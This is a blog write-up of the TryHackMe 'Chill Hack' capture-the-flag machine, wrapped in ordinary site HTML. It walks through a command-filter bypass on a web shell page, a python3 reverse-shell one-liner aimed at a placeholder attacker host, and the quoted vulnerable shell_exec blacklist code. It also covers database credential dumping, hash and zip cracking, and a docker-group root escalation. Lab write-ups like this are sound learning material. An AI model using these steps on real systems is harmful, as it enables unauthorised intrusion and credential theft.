@@ -1,0 +1,795 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+    <!-- Document Settings -->
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <!-- Base Meta -->
+    <!-- dynamically fixing the title for tag/author pages -->
+
+
+
+    <title>Chill Hack Write Up</title>
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <!-- Styles'n'Scripts -->
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.edited.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/syntax.css" />
+    <!-- highlight.js -->
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
+    <style>.hljs { background: none; }</style>
+
+    <!--[if IE]>
+        <style>
+            p, ol, ul{
+                width: 100%;
+            }
+            blockquote{
+                width: 100%;
+            }
+        </style>
+    <![endif]-->
+    
+    <!-- This tag outputs SEO meta+structured data and other important settings -->
+    <meta name="description" content="Infosec | Hacking | CTF" />
+    <link rel="shortcut icon" href="https://darrynbrownfield.co.uk/assets/images/favicon.png" type="image/png" />
+    <link rel="canonical" href="https://darrynbrownfield.co.uk/chillhack" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+
+     <!--title below is coming from _includes/dynamic_title-->
+    <meta property="og:site_name" content="Darryn Brownfield" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Chill Hack Write Up" />
+    <meta property="og:description" content="Overview Chillhack is a great boot2root machine from TryHackMe. Credit to Anurodh for a great room. It felt like this machine had everything chaining lots of elements together to finally get SSH access as a user then a simple priv esc to root. We have two tasks to complete, obtain" />
+    <meta property="og:url" content="https://darrynbrownfield.co.uk/chillhack" />
+    <meta property="og:image" content="https://darrynbrownfield.co.uk/assets/images/chillhack/cover.png" />
+    <meta property="article:publisher" content="https://www.facebook.com/" />
+    <meta property="article:author" content="https://www.facebook.com/" />
+    <meta property="article:published_time" content="2020-12-05T00:00:00+00:00" />
+    <meta property="article:modified_time" content="2020-12-05T00:00:00+00:00" />
+    <meta property="article:tag" content="Tryhackme" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Chill Hack Write Up" />
+    <meta name="twitter:description" content="Overview Chillhack is a great boot2root machine from TryHackMe. Credit to Anurodh for a great room. It felt like this machine had everything chaining lots of elements together to finally get SSH access as a user then a simple priv esc to root. We have two tasks to complete, obtain" />
+    <meta name="twitter:url" content="https://darrynbrownfield.co.uk/" />
+    <meta name="twitter:image" content="https://darrynbrownfield.co.uk/assets/images/chillhack/cover.png" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Darryn Brownfield" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="Tryhackme" />
+    <meta name="twitter:site" content="@dazbrownfield" />
+    <meta name="twitter:creator" content="@dazbrownfield" />
+    <meta property="og:image:width" content="1400" />
+    <meta property="og:image:height" content="933" />
+
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Website",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Darryn Brownfield",
+        "logo": "https://darrynbrownfield.co.uk/assets/images/blog-icon.png"
+    },
+    "url": "https://darrynbrownfield.co.uk/chillhack",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://darrynbrownfield.co.uk/assets/images/chillhack/cover.png",
+        "width": 2000,
+        "height": 666
+    },
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://darrynbrownfield.co.uk/chillhack"
+    },
+    "description": "Overview Chillhack is a great boot2root machine from TryHackMe. Credit to Anurodh for a great room. It felt like this machine had everything chaining lots of elements together to finally get SSH access as a user then a simple priv esc to root. We have two tasks to complete, obtain"
+}
+    </script>
+
+    <!-- <script type="text/javascript" src="https://demo.ghost.io/public/ghost-sdk.min.js?v=724281a32e"></script>
+    <script type="text/javascript">
+    ghost.init({
+    	clientId: "ghost-frontend",
+    	clientSecret: "f84a07a72b17"
+    });
+    </script> -->
+
+    <meta name="generator" content="Jekyll 3.6.2" />
+    <link rel="alternate" type="application/rss+xml" title="Chill Hack Write Up" href="/feed.xml" />
+
+
+</head>
+<body class="post-template">
+
+    <div class="site-wrapper">
+        <!-- All the main content gets inserted here, index.hbs, post.hbs, etc -->
+        <!-- default -->
+
+<!-- The tag above means: insert everything in this file
+into the {body} of the default.hbs template -->
+
+<header class="site-header outer">
+    <div class="inner">
+        <nav class="site-nav">
+    <div class="site-nav-left">
+        
+            
+
+            
+        
+        
+            <ul class="nav" role="menu">
+    <li class="nav-home" role="menuitem"><a href="/">Home</a></li>
+    <li class="nav-about" role="menuitem"><a href="/about/">About</a></li>
+    <li class="nav-getting-started" role="menuitem"><a href="/tag/ctf/">CTF</a></li>
+</ul>
+
+        
+    </div>
+    <div class="site-nav-right">
+        <div class="social-links">
+            
+            <a
+              class="social-link social-link-tw"
+              href="https://github.com/darrynb89"
+              target="_blank"
+              rel="noopener"
+              ><svg
+  version="1.0"
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 120.000000 120.000000"
+>
+  <g
+    transform="translate(0.000000,120.000000) scale(0.0900000,-0.0900000)"
+    fill="#ffffff"
+    stroke="none"
+  >
+    <path
+      d="M441 1174 c-105 -28 -181 -73 -266 -159 -125 -124 -175 -246 -175
+-425 0 -179 50 -300 175 -425 85 -85 185 -145 243 -145 36 0 42 13 42 89 l0
+57 -57 -3 c-74 -5 -117 17 -150 78 -13 24 -37 56 -54 71 -34 33 -36 38 -9 38
+12 0 20 -7 20 -16 0 -10 6 -14 14 -11 10 4 13 1 9 -9 -3 -10 2 -14 18 -14 18
+0 20 -3 10 -9 -16 -11 -4 -34 14 -27 9 3 11 -2 7 -16 -4 -18 -2 -20 21 -14 20
+5 25 3 21 -8 -9 -23 17 -31 33 -11 12 17 13 17 13 2 0 -11 8 -17 21 -17 15 0
+19 5 15 15 -3 8 -1 15 4 15 6 0 10 -7 10 -15 0 -8 7 -15 15 -15 8 0 15 8 15
+18 0 10 10 39 23 64 l23 46 -59 13 c-136 28 -210 123 -211 268 -1 66 3 82 27
+124 23 39 27 55 22 86 -7 40 9 121 24 121 18 0 78 -25 113 -46 30 -19 42 -22
+70 -14 18 6 71 10 118 10 47 0 100 -4 118 -10 28 -8 40 -5 70 14 35 21 95 46
+113 46 15 0 31 -81 24 -121 -5 -31 -1 -47 22 -86 24 -42 28 -58 27 -123 -1
+-147 -65 -231 -203 -266 l-68 -18 18 -30 c15 -25 19 -51 19 -138 0 -58 3 -113
+6 -122 20 -52 166 16 279 129 125 125 175 246 175 425 0 179 -50 301 -175 425
+-86 87 -161 131 -270 160 -75 19 -241 19 -314 -1z"
+    />
+  </g>
+</svg></a
+            >
+            
+            <a
+              class="social-link social-link-li"
+              href="https://www.linkedin.com/in/darryn-brownfield-0b1132b5"
+              target="_blank"
+              rel="noopener"
+              ><svg viewBox="0 50 512 512">
+    <g transform="translate(0.000000,20.000000) scale(1.1)">
+      <path
+        d="M150.65,100.682c0,27.992-22.508,50.683-50.273,50.683c-27.765,0-50.273-22.691-50.273-50.683
+      C50.104,72.691,72.612,50,100.377,50C128.143,50,150.65,72.691,150.65,100.682z M143.294,187.333H58.277V462h85.017V187.333z
+      M279.195,187.333h-81.541V462h81.541c0,0,0-101.877,0-144.181c0-38.624,17.779-61.615,51.807-61.615
+      c31.268,0,46.289,22.071,46.289,61.615c0,39.545,0,144.181,0,144.181h84.605c0,0,0-100.344,0-173.915
+      s-41.689-109.131-99.934-109.131s-82.768,45.369-82.768,45.369V187.333z"
+      />
+    </g>
+  </svg></a
+            >
+             
+            <a
+              class="social-link social-link-tw"
+              href="https://twitter.com/dazbrownfield"
+              target="_blank"
+              rel="noopener"
+              ><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
+</a
+            >
+             
+          </div>
+</nav>
+
+    </div>
+</header>
+
+<!-- Everything inside the #post tags pulls data from the post -->
+<!-- #post -->
+
+<main id="site-main" class="site-main outer" role="main">
+    <div class="inner">
+
+        <article class="post-full  tag-tryhackme tag-ctf tag-easy post ">
+
+            <header class="post-full-header">
+                <section class="post-full-meta">
+                    <time class="post-full-meta-date" datetime=" 5 December 2020"> 5 December 2020</time>
+                    
+                        <span class="date-divider">/</span>
+                        
+                            
+                               <a href='/tag/tryhackme/'>TRYHACKME</a>,
+                            
+                        
+                            
+                               <a href='/tag/ctf/'>CTF</a>,
+                            
+                        
+                            
+                               <a href='/tag/easy/'>EASY</a>
+                            
+                        
+                    
+                </section>
+                <h1 class="post-full-title">Chill Hack Write Up</h1>
+            </header>
+
+            <section class="post-full-content">
+                <div class="kg-card-markdown">
+                    <p><img src="/assets/images/chillhack/cover.png" alt="Chillhack" /></p>
+
+<h3 id="overview">Overview</h3>
+
+<p><a href="https://tryhackme.com/room/chillhack">Chillhack</a> is a great boot2root machine from <a href="https://tryhackme.com">TryHackMe</a>. Credit to <a href="https://twitter.com/acharya_anurodh">Anurodh</a> for a great room. It felt like this machine had everything chaining lots of elements together to finally get SSH access as a user then a simple priv esc to root.  We have two tasks to complete, obtain the user and root flags.</p>
+
+<h3 id="nmap">Nmap</h3>
+
+<pre><code class="language-highlight">└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.226.46
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-05 11:06 GMT
+Nmap scan report for 10.10.226.46
+Host is up (0.028s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 1001     1001           90 Oct 03 04:33 note.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
+|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
+|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Game Info
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.79 seconds
+</code></pre>
+
+<p>3 Ports open:</p>
+
+<ul>
+  <li>21 - FTP - Anonymous login allowed with a note.txt file</li>
+  <li>22 - SSH - Banner is showing its an Ubuntu machine</li>
+  <li>80 - HTTP - Apache web server version 2.4.29</li>
+</ul>
+
+<p>I also ran a full port scan but no additional ports were found.</p>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<p>First I had a look at the note on the FTP server. I logged in with the anonymous account and downloaded the file. The note reads:</p>
+
+<p>“Anurodh told me that there is some filtering on strings being put in the command – Apaar”</p>
+
+<p>No idea what this is related to yet so I started to look at the web server. I kicked off a gobuster while I had a click around the webpages.</p>
+
+<pre><code class="language-highlight">└──╼ $gobuster dir -u http://10.10.226.46 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.226.46
+[+] Threads:        50
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/12/05 11:12:39 Starting gobuster
+===============================================================
+/images (Status: 301)
+/css (Status: 301)
+/js (Status: 301)
+/fonts (Status: 301)
+/secret (Status: 301)
+/server-status (Status: 403)
+===============================================================
+2020/12/05 11:14:34 Finished
+===============================================================
+</code></pre>
+
+<p>Clicking around didnt reveal much however the gobuster found the directory /secret</p>
+
+<p><img src="/assets/images/chillhack/command.png" alt="command" /></p>
+
+<p>This must be what the note is refering to. I started with some basics commands to see what was possible such as whoami, pwd, date which were all successful and returned a response.</p>
+
+<p><img src="/assets/images/chillhack/wwwdata.png" alt="wwwdata" /></p>
+
+<p>However when I tried ls or ‘cat /etc/passwd’ I got an alert! However I didn’t get blocked so I could keep testing commands.</p>
+
+<p><img src="/assets/images/chillhack/hacker.png" alt="hacker" /></p>
+
+<h3 id="initial-access">Initial Access</h3>
+
+<p>Based on the recon so far I was confident my foothold would be via the /secret directory and bypassing the command filter I might be able to either get a SSH key or reverse shell.</p>
+
+<p>I tried testing various commands and found I was able to bypass the filter using quotes. When I tried to run ‘ls’ before it failed however when I put the command in quotes I get a response.</p>
+
+<p><img src="/assets/images/chillhack/lsworked.png" alt="lsworked" /></p>
+
+<p>I started a netcat listener on my attacker VM I tried a couple of reverse shell one liners but finally got success with python3.</p>
+
+<p>`python3 -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“ATTACK VM”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’`</p>
+
+<pre><code class="language-highlight">└──╼ $nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [ATTACK VM] from (UNKNOWN) [10.10.226.46] 45160
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+
+<p>We have a shell! Looking at index.php shows the blacklist.</p>
+
+<pre><code class="language-highlight">&lt;html&gt;                                                                                                                             
+&lt;body&gt;                                                                                                                             
+                                                                                                                                   
+&lt;form method="POST"&gt;                                                                                                               
+        &lt;input id="comm" type="text" name="command" placeholder="Command"&gt;                                                         
+        &lt;button&gt;Execute&lt;/button&gt;                                                                                                   
+&lt;/form&gt;                                                                                                                            
+&lt;?php                                                                                                                              
+        if(isset($_POST['command']))                                                                                               
+        {
+                $cmd = $_POST['command'];
+                $store = explode(" ",$cmd);
+                $blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls');
+                for($i=0; $i&lt;count($store); $i++)
+                {
+                        for($j=0; $j&lt;count($blacklist); $j++)
+                        {
+                                if($store[$i] == $blacklist[$j])
+                                {?&gt;
+                                        &lt;h1 style="color:red;"&gt;Are you a hacker?&lt;/h1&gt;
+                                        &lt;style&gt;
+                                                body
+                                                {
+                                                        background-image: url('images/FailingMiserableEwe-size_restricted.gif');
+                                                        background-position: center center;
+                                                        background-repeat: no-repeat;
+                                                        background-attachment: fixed;
+                                                        background-size: cover;
+        }
+                                        &lt;/style&gt;
+&lt;?php                                    return;
+                                }
+                        }
+                }
+                ?&gt;&lt;h2 style="color:blue;"&gt;&lt;?php echo shell_exec($cmd);?&gt;&lt;/h2&gt;
+                        &lt;style&gt;
+                             body
+                             {
+                                   background-image: url('images/blue_boy_typing_nothought.gif');  
+                                   background-position: center center;
+                                   background-repeat: no-repeat;
+                                   background-attachment: fixed;
+                                   background-size: cover;
+}
+                          &lt;/style&gt;
+        &lt;?php }
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>I can see 3 users ‘aurick’, ‘apaar’ and ‘anurodh’ however I could only access apaar’s directory but couldn’t read any files. I went back to /var/www to enumerate further and found the directory ‘files’. Looking at index.php I found a mysql username and password.</p>
+
+<pre><code class="language-highlight">$ mysql -u root -p
+mysql -u root -p
+Enter password: 
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 6
+Server version: 5.7.31-0ubuntu0.18.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql&gt; show databases;                                            
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| webportal          |
++--------------------+
+5 rows in set (0.00 sec)
+
+mysql&gt; use webportal;
+use webportal;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql&gt; show tables;
+show tables;
++---------------------+
+| Tables_in_webportal |
++---------------------+
+| users               |
++---------------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select * from users;
+select * from users;
++----+-----------+----------+-----------+----------------------------------+
+| id | firstname | lastname | username  | password                         |
++----+-----------+----------+-----------+----------------------------------+
+|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de2REDACTED      |
+|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df05REDACTED      |
++----+-----------+----------+-----------+----------------------------------+
+2 rows in set (0.00 sec)
+</code></pre>
+
+<p>Found some users, the passwords look like md5 hashes so I created a file on my attack VM with both hashes in and then ran hashcat to crack them.</p>
+
+<pre><code class="language-highlight">└──╼ $hashcat -m 0 hashes /usr/share/wordlists/rockyou.txt --force                                         
+hashcat (v5.1.0) starting...                                                                               
+                                                                                                           
+OpenCL Platform #1: The pocl project                                                                       
+====================================                                                                       
+* Device #1: pthread-Intel(R) Core(TM) i5-7500 CPU @ 3.40GHz, 512/1472 MB allocatable, 2MCU                
+                                                                                                           
+Hashes: 2 digests; 2 unique digests, 1 unique salts                                                        
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates                               
+Rules: 1                                                                                                   
+                                                                                                           
+Applicable optimizers:                                                                                     
+* Zero-Byte                                                                                                
+* Early-Skip                                                                                               
+* Not-Salted                                                                                               
+* Not-Iterated                                                                                             
+* Single-Salt                                                                                              
+* Raw-Hash                                                                                                 
+                                                                                                           
+Minimum password length supported by kernel: 0                                                             
+Maximum password length supported by kernel: 256                                                           
+                                                                                                           
+ATTENTION! Pure (unoptimized) OpenCL kernels selected.                                                     
+This enables cracking passwords and salts &gt; length 32 but for the price of drastically reduced performance.
+If you want to switch to optimized OpenCL kernels, append -O to your commandline.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 2 secs
+
+686216240e5af30df05REDACTED:&lt;hidden&gt;
+7e53614ced3640d5de2REDACTED:&lt;hidden&gt;  
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: MD5
+Hash.Target......: hashes
+Time.Started.....: Sat Dec  5 12:08:01 2020 (3 secs)
+Time.Estimated...: Sat Dec  5 12:08:04 2020 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  2713.5 kH/s (0.23ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 2/2 (100.00%) Digests, 1/1 (100.00%) Salts
+Progress.........: 5736448/14344385 (39.99%)
+Rejected.........: 0/5736448 (0.00%)
+Restore.Point....: 5734400/14344385 (39.98%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: maston420 -&gt; masta619
+
+Started: Sat Dec  5 12:07:49 2020
+Stopped: Sat Dec  5 12:08:05 2020
+</code></pre>
+
+<p>Both hashes successfully cracked. I tried to use them to log in via SSH but that didn’t work. I went back to the /var/www/files directory to have a look at what was going on. When a user successfully logged in they were directed to hacker.php. Looking at the hacker.php the following code looked interesting:</p>
+
+<pre><code class="language-highlight">&lt;center&gt;
+        &lt;img src = "images/hacker-with-laptop_23-2147985341.jpg"&gt;&lt;br&gt;
+        &lt;h1 style="background-color:red;"&gt;You have reached this far. &lt;/h2&gt;
+        &lt;h1 style="background-color:black;"&gt;Look in the dark! You will find your answer&lt;/h1&gt;
+&lt;/center&gt;
+</code></pre>
+
+<p>My initial thought was steganography in the hacker image, there are lots of ways I could have copied the images to my attack machine however I could see the webpage was being hosted locally on port 9001 so I used SSH to tunnel the port so I could access the webpage.</p>
+
+<pre><code class="language-highlight">$ netstat -ntlp                                                                                 
+netstat -ntlp                                                                                   
+(Not all processes could be identified, non-owned process info                                  
+ will not be shown, you would have to be root to see it all.)                                   
+Active Internet connections (only servers)                                                      
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:9001          0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -               
+tcp6       0      0 :::22                   :::*                    LISTEN      -               
+tcp6       0      0 :::80                   :::*                    LISTEN      -               
+tcp6       0      0 :::21                   :::*                    LISTEN      -               
+</code></pre>
+
+<p>On the ‘victim’ machine I issued the command ‘ssh -N -R ATTACKERVMIP:9001:127.0.0.1:9001 daz@ATTACKERVMIP’. Now on my attack VM I could web browse to 127.0.0.1:9001 and get access to the login page.</p>
+
+<p><img src="/assets/images/chillhack/login.png" alt="login" /></p>
+
+<p>I logged in with aurick credentials.</p>
+
+<p><img src="/assets/images/chillhack/9001.png" alt="9001" /></p>
+
+<p>Now its simple to just right click and download the hacker image to my machine.  Now the image in on my machine and check for any hidden files.</p>
+
+<pre><code class="language-highlight">└──╼ $steghide extract -sf hacker-with-laptop_23-2147985341.jpg
+Enter passphrase:                                              
+wrote extracted data to "backup.zip".                          
+</code></pre>
+<p>Using steghide I was able to extract a zip file. However the zip file was password protected.</p>
+
+<pre><code class="language-highlight">└──╼ $/usr/sbin/zip2john backup.zip &gt; ziphash
+ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: 2b chk, TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3
+</code></pre>
+
+<p>Using zip2john I was able to generate the password hash. I extracted the hash from the ziphash output and put in to a new file called newzip. and used the hashcat to crack: hashcat -m 17200 newzip /usr/share/wordlists/rockyou.txt –force</p>
+
+<p>The password cracked successfully, I used the password to unzip the file and got source_code.php. Within the source code was a base64 encoded password.</p>
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/ChillHack]
+└──╼ $echo IWQwbnRLbjB3bREDACTED | base64 -d
+&lt;hidden&gt;
+</code></pre>
+
+<p>I decoded the hash and tried to login using SSH. I was successful with the user anurodh.</p>
+
+<p>Once on the machine I did ‘sudo -l’ to check if there was a quick win to priv esc. I also checked the users home directory for the user flag, however it was not there.</p>
+
+<pre><code class="language-highlight">anurodh@ubuntu:/dev/shm$ sudo -l
+Matching Defaults entries for anurodh on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User anurodh may run the following commands on ubuntu:
+    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
+</code></pre>
+
+<p>No priv esc to root however I could run a script owned by apaar.</p>
+
+<pre><code class="language-highlight">anurodh@ubuntu:/$ sudo -u apaar /home/apaar/.helpline.sh
+
+Welcome to helpdesk. Feel free to talk to anyone at any time!
+
+Enter the person whom you want to talk with: aurick   
+Hello user! I am aurick,  Please enter your message: id    
+uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
+Thank you for your precious time!
+anurodh@ubuntu:/$ sudo -u apaar /home/apaar/.helpline.sh
+
+Welcome to helpdesk. Feel free to talk to anyone at any time!
+
+Enter the person whom you want to talk with: aurick
+Hello user! I am aurick,  Please enter your message: cat /home/apaar/local.txt
+{USER-FLAG: e8vpd3323cfvlp0qpxxx9qREDACTED}
+Thank you for your precious time!
+anurodh@ubuntu:/$ 
+</code></pre>
+
+<p>I was able to run commands as apaar, when I first got a foot hold one the machine I found a local.txt file in apaar’s home directory but was unable to read it. However now I can run commands as the apaar user so I used cat to read the file and got the user flag.</p>
+
+<h3 id="priv-esc">Priv Esc</h3>
+
+<p>I did some enumeration using the apaar user by using the helpline.sh script and the command ‘bash -i’ to get shell on the box as the apaar user however I didnt find much so I went back to the anurodh user and ran linpeas.</p>
+
+<p>anurodh is a memeber of the docker group, this <a href="https://www.hackingarticles.in/docker-privilege-escalation/">blog</a> details how a machine can be exploited via docker.</p>
+
+<pre><code class="language-highlight">anurodh@ubuntu:/dev/shm$ docker images
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+alpine              latest              a24bb4013296        6 months ago        5.57MB
+hello-world         latest              bf756fb1ae65        11 months ago       13.3kB
+anurodh@ubuntu:/dev/shm$ docker run -v /etc/:/mnt -it alpine
+/ # cd /mnt
+/mnt # cd root
+/mnt/root # cat proof.txt 
+
+
+                                        {ROOT-FLAG: w18gfpn9xehsgd3tovhREDACTED}
+
+
+Congratulations! You have successfully completed the challenge.
+</code></pre>
+
+<p>Thats root! Thanks for reading!</p>
+
+                </div>
+            </section>
+
+            <!-- Email subscribe form at the bottom of the page -->
+            
+
+            <footer class="post-full-footer">
+                <!-- Everything inside the #author tags pulls data from the author -->
+            </footer>
+
+            <!-- If you use Disqus comments, just uncomment this block.
+            The only thing you need to change is "test-apkdzgmqhj" - which
+            should be replaced with your own Disqus site-id. -->
+            
+
+        </article>
+
+    </div>
+</main>
+
+
+
+        <!-- Previous/next page links - displayed on every page -->
+        
+
+        <!-- The footer at the very bottom of the screen -->
+        <footer class="site-footer outer">
+            <div class="site-footer-content inner">
+                <section class="copyright"><a href="https://darrynbrownfield.co.uk/">Darryn Brownfield</a> &copy; 2020</section>
+                <nav class="site-footer-nav">
+                    <a href="/">Latest Posts</a>
+                 </nav>
+            </div>
+        </footer>
+
+    </div>
+
+    <!-- The big email subscribe modal content -->
+    
+
+    <!-- highlight.js -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.10.0/components/prism-abap.min.js"></script>
+    <script>$(document).ready(function() {
+      $('pre code').each(function(i, block) {
+        hljs.highlightBlock(block);
+      });
+    });</script>
+
+    <!-- jQuery + Fitvids, which makes all video embeds responsive -->
+    <script
+        src="https://code.jquery.com/jquery-3.2.1.min.js"
+        integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
+        crossorigin="anonymous">
+    </script>
+    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
+    <script type="text/javascript" src="https://demo.ghost.io/assets/js/jquery.fitvids.js?v=724281a32e"></script>
+
+
+    <!-- Paginator increased to "infinit" in _config.yml -->
+    <!-- if paginator.posts  -->
+    <!-- <script>
+        var maxPages = parseInt('');
+    </script>
+    <script src="/assets/js/infinitescroll.js"></script> -->
+    <!-- /endif -->
+
+    
+
+
+    <!-- Add Google Analytics  -->
+    <!-- Google Analytics Tracking code -->
+ <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-175458891-1', 'auto');
+  ga('send', 'pageview');
+
+ </script>
+
+
+    <!-- The #block helper will pull in data from the #contentFor other template files. In this case, there's some JavaScript which we only want to use in post.hbs, but it needs to be included down here, after jQuery has already loaded. -->
+    
+        <script>
+
+// NOTE: Scroll performance is poor in Safari
+// - this appears to be due to the events firing much more slowly in Safari.
+//   Dropping the scroll event and using only a raf loop results in smoother
+//   scrolling but continuous processing even when not scrolling
+$(document).ready(function () {
+    // Start fitVids
+    var $postContent = $(".post-full-content");
+    $postContent.fitVids();
+    // End fitVids
+
+    var progressBar = document.querySelector('progress');
+    var header = document.querySelector('.floating-header');
+    var title = document.querySelector('.post-full-title');
+
+    var lastScrollY = window.scrollY;
+    var lastWindowHeight = window.innerHeight;
+    var lastDocumentHeight = $(document).height();
+    var ticking = false;
